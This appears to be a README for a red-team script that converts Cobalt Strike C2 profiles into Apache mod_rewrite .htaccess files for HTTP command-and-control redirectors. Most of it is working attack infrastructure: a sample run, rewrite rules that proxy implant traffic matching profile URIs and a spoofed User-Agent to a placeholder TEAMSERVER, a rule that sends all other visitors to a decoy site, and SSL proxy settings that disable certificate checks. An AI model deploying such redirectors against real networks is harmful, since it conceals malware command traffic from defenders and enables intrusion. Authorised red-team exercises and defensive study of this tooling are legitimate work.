# Convert Cobalt Strike profiles to Apache mod_rewrite .htaccess files to support HTTP C2 Redirection

This is a quick script that converts a Cobalt Strike profile to a base mod_rewrite .htaccess file to support HTTP redirection with Cobalt Strike

You will most likely want to tune and test before use, but it does help get the script started.

This was heavily based on the work by Jeff Dimmock @bluescreenofjeff

__Updates and Features__

 - Uses the Profile User-Agent and Endpoint URI to create rewrite rules
 - Support CobaltStrike 3.10 HTTP Stager
 - Template for Scripted Web Delivery support

## Quick start

The havex.profile example is included for a quick test.

1) Run the script against a profile
2) Save the output to .htaccess
3) Modify as needed
4) Use script with your Apache redirector

## Example

    python csToModrewrite.py -i havex.profile -c http://TEAMSERVER -d http://GOHERE
    
    RewriteEngine On
    
    # Scripted Web Delivery (Optional)
    # Uncomment and adjust as needed
    #RewriteCond %{REQUEST_URI} ^/imgs/logo1.png?$
    #RewriteCond %{HTTP_USER_AGENT} ^$
    #RewriteRule ^.*$ http://TEAMSERVER%{REQUEST_URI} [P]
    #RewriteCond %{REQUEST_URI} ^/..../?$
    
    # C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs) 
    RewriteCond %{REQUEST_URI} ^/(/include/template/isx.php|/wp06/wp-includes/po.php|/wp08/wp-includes/dtcla.php|/modules/mod_search.php|/blog/wp-includes/pomo/src.php|/includes/phpmailer/class.pop3.php|/api/516280565958|/api/516280565959)/?$
    RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5\.0\ (Windows;\ U;\ MSIE\ 7\.0;\ Windows\ NT\ 5\.2)\ Java/1\.5\.0_08)?$
    RewriteRule ^.*$ http://TEAMSERVER{REQUEST_URI} [P]
    
    # Redirect All other traffic here
    RewriteRule ^.*$ http://GOHERE/? [L,R=302]

----------------------------------------------
## Apache Rewrite Setup and Tips

__Enable Rewrite and Proxy__

    a2enmod rewrite
    a2enmod proxy
    a2enmod proxy_http
    service apache2 reload

__SSL support requires the following in the site config__

    # Enable SSL
    SSLEngine On
    # Enable Proxy
    SSLProxyEngine On
    # Trust Self-Signed Certificates generate by CobaltStrike
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off

## References


[Apache mod_rewrite](http://httpd.apache.org/docs/current/mod/mod_rewrite.html)

[Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite](https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/)